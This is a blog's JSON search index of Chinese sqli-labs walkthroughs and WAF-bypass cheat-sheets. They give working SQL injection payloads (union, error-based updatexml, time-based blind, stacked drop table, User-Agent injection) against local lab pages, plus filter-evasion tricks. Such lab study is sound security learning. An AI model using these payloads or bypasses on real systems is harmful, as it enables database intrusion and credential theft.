{"meta":{"title":"栈桥仔","subtitle":"","description":"","author":"zhanqiaozai","url":"https://zhanqiaozai.github.io","root":"/"},"pages":[],"posts":[{"title":"sqli-labs关卡/漏洞银行WAF绕过","slug":"sqli-labs关卡/漏洞银行WAF绕过","date":"2020-07-25T01:18:02.712Z","updated":"2020-03-22T02:33:17.422Z","comments":true,"path":"2020/07/25/sqli-labs关卡/漏洞银行WAF绕过/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8CWAF%E7%BB%95%E8%BF%87/","excerpt":"","text":"WAF绕过技巧基于黑名单，空格代替，转义空格过滤绕过 无空格的查询：1index.php?id&#x3D;1e0and&#123;&#96;&#96;select(left(database(),1))&#x3D;&#39;a&#39;&#125; 特殊位置代替空格： 科学计数法(1e0,.,) 数学计算(+-*/) 特殊字符(\\N) 注释符(/**/) 转义 注释符+%0a换行 大小写替换 /**/注释、%0b、+、||、分割关键字 内联注释绕过 %df宽字节绕过 溢出绕过 等等 基于HTTP协议的绕过方法古老的HTTP 0.9协议例如：GET http://127.0.0.1/Less-1/index.php 其中并没有其他的user-agent，cookie什么的，只有一个GET请求，所以很多网站不认识，WAF直接放行 分块传输/Chunked Transfer(Http 1.1) 协议未覆盖绕过以下为四种常见的content-type类型，尝试互相替换尝试绕过WAF过滤机制 注：如图常见的绕过方式为使用 multipart/form-data 标签，并把name设为参数名内容写入注入语句 1234content-Type: test&#x2F;html; charset&#x3D;UTF-8content-Type: application&#x2F;json; charset&#x3D;UTF-8content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;utf-8content-Type: multipart&#x2F;form-data; boundary&#x3D;something","categories":[],"tags":[]},{"title":"sqli-labs关卡/sql注入WAF绕过","slug":"sqli-labs关卡/sql注入WAF绕过","date":"2020-07-25T01:18:02.710Z","updated":"2020-03-21T15:18:20.996Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sql注入WAF绕过/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/","excerpt":"","text":"1、sql注释符绕过（1）union /**/select 我们将union select之间的空格使用指示符进行替换（适用于对union select之间的空格进行检测的情况） （2）union/*dasdafaf */select 我们在注释符中间填充内容 （3）union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa */select 构造较大数据 （4）/* union select */内联注释 我们使用内联注释，mysql特有！ 2、空白符绕过（1）mysql空白符：%09；%0A；%0B；%0D；%20；%0C；%A0；/*xxx */ （2）正则空白符：%09；%0A；%0B；%0D；%20； %25就是百分号(%) %25A0就是空白符 3、函数分隔符号将一个函数进行分割concat() %25就是百分号(%) %25A0就是空白符 concat%2520( concat/**/( concat%250c( concat%25a0( 4、浮点数法WAF对于id=1可以进行检测，但是对于id=1E0、ID=1.0、ID=\\N可能就无法检测 5、利用error-based进行sql注入extractvalue(1,comcat(0x5c,md5(3))); updatexml(1,concat(0x5d,md5(3)),1); GeometryCollection((select * from(select * from(select @@version)f)x)) polygon((select * from(select name const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() 6、mysql特殊语法select {x schema_name} from {x information_schema.schemata}; select {x 1}; 7、大小写绕过如果对关键字 and or union等进行过滤，可以考虑使用大小写混合的方法 例如：Or aNd UniOn 但是很多时候有函数会对部分大小写进行过滤，这时候可以考虑双写的方法 8、关键字重复OORr 9、关键字替换如果还是无法绕过，可以考虑替换的方法 and —&gt; &amp;&amp; or —&gt;|| like可以替换= &lt;&gt;等价于 != 还有很多方法","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十四关POST堆叠passwd处","slug":"sqli-labs关卡/sqli-labs第四十四关POST堆叠passwd处","date":"2020-07-25T01:18:02.707Z","updated":"2020-03-25T02:24:59.540Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十四关POST堆叠passwd处/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd%E5%A4%84/","excerpt":"","text":"查看初始界面 查看源码 和前两关是一样的，都在password处注入，这次闭合只是单引号 1s&#39;; create table know like users;# 页面返回错误，不管返回什么查看一下数据库 成功地向数据库插入了表， 删除know表 1s&#39;; drop table know ;# 查看数据库，成功删除know表","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十关堆叠","slug":"sqli-labs关卡/sqli-labs第四十关堆叠","date":"2020-07-25T01:18:02.705Z","updated":"2020-03-24T12:25:05.709Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十关堆叠/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3%E5%A0%86%E5%8F%A0/","excerpt":"","text":"查看初始界面，页面返回正常 查看源代码，$id被单引号和括号包裹 加上单引号，括号和注释符查看是否返回正常，页面返回正常 使用堆叠，向数据库插入表，页面返回正常 查看数据库是否已经插入表crow，成功插入 删除crow表，页面返回正常 查看是否已经删除crow表，成功删除","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十六关SORT报错和时间","slug":"sqli-labs关卡/sqli-labs第四十六关SORT报错和时间","date":"2020-07-25T01:18:02.703Z","updated":"2020-03-25T14:01:29.777Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十六关SORT报错和时间/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/","excerpt":"","text":"查看源码，红线处为有用信息。 第一个红线，在之前关卡中，并不是SORT而是ID这里改为了SORT所以网页中也不能用?id了也是要用?sort当sort=1的时候第一列排序，等于2的时候第二列排序，以此类推这段代码的意思是：获取users所有的字段，然后order by进行排序 1&quot;SELECT * FROM users ORDER BY $id&quot; 带入，2代表的意思是第二列，如果不加desc默认升序，从小到大排序，所以这里改变2 就可以拿到所有的信息，所以存在注入点 1&quot;SELECT * FROM users ORDER BY 2&quot; 如果将sort改为4，如此也可以确定当前字段为3 以字段2做演示，查看当前界面 这里可以使用两种注入方法，第一种：报错注入。。 第二种： 时间注入 使用报错注入，12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-46&#x2F;?sort&#x3D;2 and updatexml(1,concat(0x7e,(database())),1)成功返回数据库 查看表名1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-46&#x2F;?sort&#x3D;2 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),1) 查看字段1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-46&#x2F;?sort&#x3D;2 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;)),1) 查看数据12这里不能用limit 0,1 当前数据在起始位置已经知道了，http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-46&#x2F;?sort&#x3D;2 and updatexml(1,concat(0x7e,(select group_concat(username)from users limit 1,1)),1) 时间注入获取数据库长度，如果正确直接返回，如果错误执行sleep1if((length(database())&gt;2),1,sleep(5)) 用法和以前相同","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十八关SORT时间","slug":"sqli-labs关卡/sqli-labs第四十八关SORT时间","date":"2020-07-25T01:18:02.641Z","updated":"2020-03-25T14:01:42.141Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十八关SORT时间/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3SORT%E6%97%B6%E9%97%B4/","excerpt":"","text":"查看初始页面，页面返回正常。 查看源代码， 使用单引号查看是否有报错信息，并没有返回报错信息，说明当前不能使用报错注入，要是用时间注入 使用之间注入查看当前数据库长度，设置当字符长度大于1时返回，否则执行sleep 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if((length(database())&gt;1),1,sleep(3))数据库长度大于1返回了结果 看看等于1，当等于1是数据库一直在加载 经过测试，当数据库等于8的时候页面正常 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if((length(database())&#x3D;8),1,sleep(3)) 查看库名，ascii115转移过来是s，经过测试得知数据库security 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10)) 得知是security库，查看库下的表 123http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101,1,sleep(10))当ascii等于101的时后页面返回正常101对应的是e经过测试得出第一个表时emails 更改ascii值查看页面是否会报错，ascii等于105时一直加载说明错误 查看emails表中的字段 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(10))ascii 101对应的是i得出第一个字段是id 查看一下id的值 12http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-48&#x2F;?sort&#x3D;3 and if(ascii(substr((select id from emails limit 0,1),1,1))&#x3D;49,1,sleep(10))ascii49对应的值是1，emails字段中得第一个数据是1","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十五关POST堆叠passwd","slug":"sqli-labs关卡/sqli-labs第四十五关POST堆叠passwd","date":"2020-07-25T01:18:02.639Z","updated":"2020-03-25T03:49:00.679Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十五关POST堆叠passwd/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3POST%E5%A0%86%E5%8F%A0passwd/","excerpt":"","text":"查看原页面 查看源码， 与之前一样，单引号加括号闭合 1s&#39;); create table know like users;# 查看数据库，发现成功插入数据库know 删除数据库know 1s&#39;); drop table know;# 查看数据库是否已经删除","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十二关POST堆叠password处","slug":"sqli-labs关卡/sqli-labs第四十二关POST堆叠password处","date":"2020-07-25T01:18:02.637Z","updated":"2020-03-24T14:34:52.755Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十二关POST堆叠password处/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/","excerpt":"","text":"查看初始页面 查看源码，发现将username对单引号等字符进行了过滤处理，说明不能再username处注入，因为是post注入，在password处，说明在登录界面进行注入 在password处使用堆叠向数据库插入表，用户名和密码随便输，发现输入的密码看不见，这样我们并不知道我们输入的正不正确 更改网页源码，查看网页元素，点击箭头 选中password输入框，会出来这一串代码 将type后的password改为text，这样密码处输入的内容就显示了 使用堆叠，向数据库插入表，账号密码随便输入1s&#39;; create table crow like users;# 点击login登录，页面返回错误， 这里先不管他显示的是正确还是错误，查看一下数据库，看一下表是否已经出入进去了，表已经成功插入进去了 使用相同的命令删除crow表，点击login登录1s&#39;; drop table crow ; # 页面依然显示报错，查看一下数据库是否已经删除表了 成功将表删除，说明命令正确","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十九关SORT时间","slug":"sqli-labs关卡/sqli-labs第四十九关SORT时间","date":"2020-07-25T01:18:02.635Z","updated":"2020-03-26T02:22:03.754Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十九关SORT时间/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3SORT%E6%97%B6%E9%97%B4/","excerpt":"","text":"查看原始页面。 查看源码，使用了单引号包裹 在页面中加入单引号，报错没有使用注释符 使用注释符，页面返回正常 因为使用注释符的时候页面并没有返回报错信息，所以不能使用报错注入，使用时间盲注。 查看数据库长度，当数据库长度为8的时候返回正确页面，等于其他的时候一直加载 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if((length(database())&#x3D;8 ),1,sleep(3))--+ 查看当前数据库，ascii 115转义过来是s，经过测试得知数据库security 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if(ascii(substr(database(),1))&#x3D;115,1,sleep(3))--+ 查看表，当ascii等于101的时后页面返回正常101对应的是e经过测试得出第一个表时emails 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101,1,sleep(3))--+ 查看emails表中的字段，ascii 105对应的是i得出第一个字段是id 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(3))--+ 查看id字段中的数据，ascii 49 对应的是1，也就是第一个数据是1 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;3&#39; and if(ascii(substr((select id from emails limit 0,1),1,1))&#x3D;49,1,sleep(3))--+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十三关POST堆叠password处","slug":"sqli-labs关卡/sqli-labs第四十三关POST堆叠password处","date":"2020-07-25T01:18:02.634Z","updated":"2020-03-25T00:48:50.323Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十三关POST堆叠password处/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3POST%E5%A0%86%E5%8F%A0password%E5%A4%84/","excerpt":"","text":"查看页面原始界面 查看一下源代码，和42关一样，过滤了username没有过滤password，包裹了username 以上都是在代码登录是注入的，尝试一下向数据库插入表，密码看不见输入的什么，更改一下源码就可以 将红线处改为text 更改之后密码显示了，点击login登录 1s&#39;) ; create table crow like users;# 页面返回错误，虽然返回错误，但是查看一下数据库是否多了crow表 数据库中成功插入crow表 删除表，使用相同方法,点击login 1s&#39;) ; drop table crow;# 页面返回错误 查看数据库，成功删除","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十七关SORT报错和时间","slug":"sqli-labs关卡/sqli-labs第四十七关SORT报错和时间","date":"2020-07-25T01:18:02.630Z","updated":"2020-03-25T14:01:36.860Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十七关SORT报错和时间/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3SORT%E6%8A%A5%E9%94%99%E5%92%8C%E6%97%B6%E9%97%B4/","excerpt":"","text":"查看初始页面。 查看源文件，和之前一关一样只是这里使用了单引号进行闭合 加上单引号查看页面，发现页面结尾返回了三个引号，因为没使用注释符 加入注释符查看页面返会结果，页面返回正常 这里使用报错注入 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-47&#x2F;?sort&#x3D;3&#39; and updatexml(1,concat(0x7e,(database())),1) --+ 查看表数据 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-47&#x2F;?sort&#x3D;3&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;)),1) --+ 查看字段 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-47&#x2F;?sort&#x3D;3&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;)),1) --+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四十一关堆叠","slug":"sqli-labs关卡/sqli-labs第四十一关堆叠","date":"2020-07-25T01:18:02.628Z","updated":"2020-03-24T13:02:59.640Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四十一关堆叠/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%E5%A0%86%E5%8F%A0/","excerpt":"","text":"查看最初页面，页面返回正常 查看源码，$id并没有被单引号包裹，这里和39关的区别就是39关加上单引号会显示报错信息，而当前加上单引号不会显示报错信息 向数据库插入表，页面返回正常 查看数据库，crow成功创建了 删除表，页面返回正常 查看数据库，成功被删除","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第四关GET联合","slug":"sqli-labs关卡/sqli-labs第四关GET联合","date":"2020-07-25T01:18:02.626Z","updated":"2020-03-16T06:28:28.408Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第四关GET联合/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%9B%9B%E5%85%B3GET%E8%81%94%E5%90%88/","excerpt":"","text":"1查看有没有注入点，看看报错信息是什么，尝试了加上单引号发现发挥正确，然后尝试一下双引号，返回错误，这里有错误说明存在注入点，在返回错误的同时，错误报告中双引号后面有一个括号，我们加上再次查看一下，页面返回是否正确， 123这里我们加上括号，因为前面加引号了所以需在加上注释符http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;1&quot;)--+页面返回正确，接下来查看一下当前字段数 123查看当前字段数http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;1&quot;) order by 4--+字段数4返回错误，我们再来尝试一下字段3 12我们查看一下字段3http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;1&quot;) order by 3--+ 123查看当前数据库http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,database()--+当前数据库时security 12查看当前数据库内的表http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+ 12查看users表中的字段http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+ 12发现表中有id，username，password等字段，我们主要查询这三个字段http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-4&#x2F;?id&#x3D;-1&quot;) union select 1,2,group_concat(id,username,password) from users--+","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十四关POST报错","slug":"sqli-labs关卡/sqli-labs第十四关POST报错","date":"2020-07-25T01:18:02.624Z","updated":"2020-03-17T09:02:35.130Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十四关POST报错/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/","excerpt":"","text":"123测试报错信息1&quot;使用双引号报错， 123加上注释符看一下是否回显正确1&quot;#没有回显说明正确 123查看字段数1&quot; order by 2 #之前试过3字段错误，2字段没有回显正确 123查看注入点1&quot; union select 1,2 #没有回显，但是之前出现过错误信息，我们这里使用报错注入试一下 123报错注入查看当前数据库名称1&quot; and updatexml(1,concat(0x7e,(database()),0x7e),1) #成功返回当前数据库security 123继续使用报错注入查看数据库下的表名1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) #成功返回emails如果要查看其他表更改limit就可以 123因为之前查的我们已知有一个users表，查看一下1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1) #第一个字段是id 123我们已知有username，password表，查看一下password1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) #页面成功返回","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十关GET时间","slug":"sqli-labs关卡/sqli-labs第十关GET时间","date":"2020-07-25T01:18:02.623Z","updated":"2020-03-17T05:16:20.298Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十关GET时间/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%B3GET%E6%97%B6%E9%97%B4/","excerpt":"","text":"1当看到you are in 就知道这是盲注，尝试使用符号，测试是否有sql注入漏洞。当经过测试之后发现和第九题一样，全部都返回you are in，尝试一下使用延迟注入， 1当我们使用单引号的时候，执行了两秒结束，说明单引号返回正确，在尝试一下双引号 发现双引号运行时间为12秒，说明双引号存在sql注入漏洞， 我要知道双引号是sql注入漏洞后，要判断当前数据库名称，并获取。 查看数据库名称的第一个字母，返回时间两秒说明正确 1为什么返回两秒正确，而不是10秒，因为在115后面跟了个1如果当ascii码等于115时执行1，不等于时执行sleep(10),所以这里执行两秒返回正确 1http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))--+ 1这里在尝试一下输入其他ascii编码看看是否跟上面我们所说的，错误时执行sleep，将ascii改成116时错误，执行sleep，按照这种方法更前,1,1的第一个数字以此类推得出当前数据库名为security 123获取表名，查看当前库下的第一个表名http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101,1,sleep(10))--+数据库中第一个表的第一个字母是的ascii码是101，对应的是e，测试之后的出表名为emails，如果ascii不是101的话执行sleep 1当判断错误时，执行sleep，将ascii码改成了102之后错误，执行sleep，以此类推，需要测试其他表时只需要更改limit就可以 123就以emails为例，查询表中的字段http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105,1,sleep(10))--+当ascii等于105的时候，返回两秒正确，测试等于其他编码时是否也会显示正确 1当这里ascii吗等于106的时候返回错误，执行sleep，说明语句正确， 1进入mysql库查看当前emails下有什么字段，查看上面操作是否正确，可以看到105对应的正是i，所以说明语句正确 1再来查询一下id表中得数据，当ascii等于49的时候返回时间2秒，说明正确，ascii中的49对应的是1， 1我们修改一下ascii码看看我们的语句是否正确，将ascii码修改成50时错误，执行sleep，执行时间12秒，数据以此类推。 1查看一下当前emails中的id字段里的第一个数据是否是1，发现确实是1说明语句正确","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十六关POST盲注","slug":"sqli-labs关卡/sqli-labs第十六关POST盲注","date":"2020-07-25T01:18:02.620Z","updated":"2020-03-18T04:30:13.257Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十六关POST盲注/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3POST%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"先查看一下源码 1底下定义的uname是双引号，将他带劲$sql语句中，只有一个双引号，所以我们使用双引号加括号，将其闭合 123将我们写sql语句带入进去&quot;SELECT username, password FROM users WHERE username&#x3D;(&quot;) or (select ascii(substr(database(),1,1))&#x3D;115)#) and password&#x3D;($passwd) LIMIT 0,1&quot;;就是这样的效果，闭合双引号，使之不成立，不成立直接执行or后面的sql语句，不管是否正确直接执行，sql语句后面有一个注释符，将开始的语句的括号注释掉 123进入网页中，查看我们的思路和写得代码是否正确uname&#x3D;&quot;) or (select ascii(substr(database(),1,1))&#x3D;115)#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit页面返回蓝色说明正确，115对应的是s 12尝试输入一个错误的ascii码，看看是否页面返回红色页面返货红色，表示错误，sql语句格式正确 12345按照上面的结果更改,1,1的值以此类推，得出当前数据库security知道当前数据库了，查看数据库下的表uname&#x3D;&quot;) or (select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101)#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit因为页面只返回对或错，并没有数值所以使用盲注这里当ascii&#x3D;101的时候返回正确，101对应的是e说明第一个字母为e，更改,1,1的值以此类推，得出第一个表时emails，想要查询其他的表的话更改limit的值 123我们以emails表为例，查询当前表下的字段，可以使用burp抓包，自动扫描uname&#x3D;&quot;) or (select ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;emails&#39; limit 0,1),1,1))&#x3D;105)#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit进行抓包，然后攻击，扫描出105这个ascii码，105对应的是i，更改,1,1的值查看当前字段后的字母，更改limit查看后面的字段 123这里我们我们经过攻击获得了id，email_id字段，我们查看一下email_id中的数据uname&#x3D;&quot;) or (select ascii(substr((select email_id from emails limit 0,1),1,1))&#x3D;68)#&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit这里payload爆出了68，68对应的ascii是D 12进入数据库查看一下，email_id的第一个数据开头是否为D判断正确，第一个字母为D,相同结论，如果要查询当前数据后面的字母更改,1,1的值，如果要看其他数据更改limit的值","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十八关POST报错User-Agent位置","slug":"sqli-labs关卡/sqli-labs第十八关POST报错User-Agent位置","date":"2020-07-25T01:18:02.619Z","updated":"2020-03-18T14:01:29.932Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十八关POST报错User-Agent位置/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3POST%E6%8A%A5%E9%94%99User-Agent%E4%BD%8D%E7%BD%AE/","excerpt":"","text":"这里是在User-Agent后注入， 查询库名 123结尾的引号是将其带入到ip和username中去进行闭合，闭合完成注释掉后面的语句1&#39; or updatexml(1,concat(0x7e,(database())),1),&#39;&#39;,&#39;&#39;)#获得库名security 12查询当前数据库中的字段1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1)),1),&#39;&#39;,&#39;&#39;)# 12查询emails下的字段1&#39; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;emails&#39; limit 0,1)),1),&#39;&#39;,&#39;&#39;)# 12查看id的第一行数据1&#39; or updatexml(1,concat(0x7e,(select id from emails limit 0,1)),1),&#39;&#39;,&#39;&#39;)#","categories":[],"tags":[]},{"title":"sqli-labs关卡/sqli-labs第十五关POST盲注","slug":"sqli-labs关卡/sqli-labs第十五关POST盲注","date":"2020-07-25T01:18:02.618Z","updated":"2020-03-18T02:44:36.028Z","comments":true,"path":"2020/07/25/sqli-labs关卡/sqli-labs第十五关POST盲注/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3POST%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"1在这里我们输入任何东西不返回错误，可以判断使用盲注 123使用盲注查看当前数据库的第一个字母uname&#x3D;&#39; or (select ascii(substr(database(),1,1)) &#x3D; 115)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit之前错误字体都返回红色，这里返回蓝色说明正确 123456看一下源码，这一句是非常重要的，也是最有用的@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39;我们将我们的公式带进去这里用直接使用单引号和用or的原因是，or只需要一边成立就执行，这里双引号闭合，里面没有内容，所以不成立，因为or的特性是只要你有一个不成立，第二个不管你成不成立直接执行，所以执行了我们后面的sql语句@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;&#39; or (select ascii(substr(database(),1,1)) &#x3D; 115)#&#39; and password&#x3D;&#39;$passwd&#39; 123这里测试其他字母uname&#x3D;&#39; or (select ascii(substr(database(),2,1)) &#x3D; 101)#&amp;passwd&#x3D;&amp;submit&#x3D;Submit输入101返回正确，ascii对应的是e，以此类推，得出当前数据库是 security 